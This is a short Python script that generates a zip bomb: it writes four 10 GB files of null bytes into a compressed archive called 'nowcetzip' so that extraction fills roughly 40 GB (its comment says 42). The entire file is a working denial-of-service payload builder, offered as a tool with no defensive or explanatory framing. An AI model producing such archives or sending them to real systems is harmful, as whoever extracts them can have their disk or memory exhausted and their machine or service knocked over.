import zipfile 
import os 

# nowcetzip 
# 10 GB * 4 so +42 GB after unzip it 

def zip_bomb(zipfilename :str):
    with zipfile.ZipFile(zipfilename,"w",compression=zipfile.ZIP_DEFLATED) as zf:
        bomb_size = 1024*1024*1024*10 # 10 GB for each
        large = b"\0" * bomb_size
        
        for i in range(4):
            zf.writestr(f"zipbombfile{i}.txt", large)

    filesize = os.path.getsize(zipfilename) / float(1024 * 1024)
    print(f"Created {zipfilename} : {filesize:.2f} MB")
    
if __name__ == "__main__":
    zip_bomb("nowcetzip")
